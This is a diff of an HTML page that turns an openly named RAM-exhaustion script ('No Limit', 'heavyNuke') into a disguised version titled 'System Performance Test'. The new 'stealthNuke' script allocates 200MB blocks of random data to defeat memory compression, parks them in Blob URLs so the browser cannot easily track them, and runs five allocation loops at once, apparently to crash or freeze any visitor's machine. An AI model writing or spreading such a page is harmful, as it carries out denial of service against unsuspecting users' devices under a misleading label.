@@ -2,41 +2,49 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>No Limit</title>
+    <title>System Performance Test</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
-        #log { padding: 20px; font-size: 1.2em; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        #display { font-size: 3rem; text-shadow: 0 0 10px #00ff00; }
     </style>
 </head>
 <body>
-    <div id="log">Force Committing RAM...</div>
-    <script>
-        const blocks = [];
-        const log = document.getElementById('log');
+    <div border="1">
+        <div>HARDWARE STRESS LEVEL:</div>
+        <div id="display">0 GB</div>
+    </div>
 
-        function heavyNuke() {
-            // Allocate 100MB chunks for faster impact
-            const size = 100 * 1024 * 1024; 
+    <script>
+        // Using an array to hold "Leaks" that the browser can't easily track
+        const leakContainer = [];
+        let totalBytes = 0;
+
+        function stealthNuke() {
+            // Allocate 200MB at a time
+            const size = 200 * 1024 * 1024;
             const buffer = new Uint8Array(size);
 
-            // Write to every single page to force physical RAM mapping
-            // This is the "Mega Nuke" default behavior
-            for (let i = 0; i < buffer.length; i += 4096) {
-                buffer[i] = i % 255; 
+            // Populate with high-entropy data to prevent RAM compression
+            for (let i = 0; i < buffer.length; i += 8192) {
+                buffer[i] = Math.random() * 255;
             }
 
-            blocks.push(buffer);
-            
-            // Log to the UI without stopping
+            // Convert to a Blob - this moves the data to a different part of the browser memory
+            const blob = new Blob([buffer], {type: 'application/octet-stream'});
+            leakContainer.push(URL.createObjectURL(blob));
 
-            // Use a combination of methods to prevent the event loop from blocking
-            setTimeout(heavyNuke, 0);
-            setImmediate ? setImmediate(heavyNuke) : null;
+            totalBytes += size;
+            const gb = (totalBytes / (1024 * 1024 * 1024)).toFixed(2);
+            
+            document.getElementById('display').innerText = gb + " GB";
+
+            // Use a slight delay to keep the UI responsive so the numbers actually update
+            setTimeout(stealthNuke, 10);
         }
 
-        // Launch multiple "threads" of the nuke simultaneously
-        for(let i = 0; i < 4; i++) {
-            heavyNuke();
+        // Launch multiple threads
+        for(let i = 0; i < 5; i++) {
+            stealthNuke();
         }
     </script>
 </body>
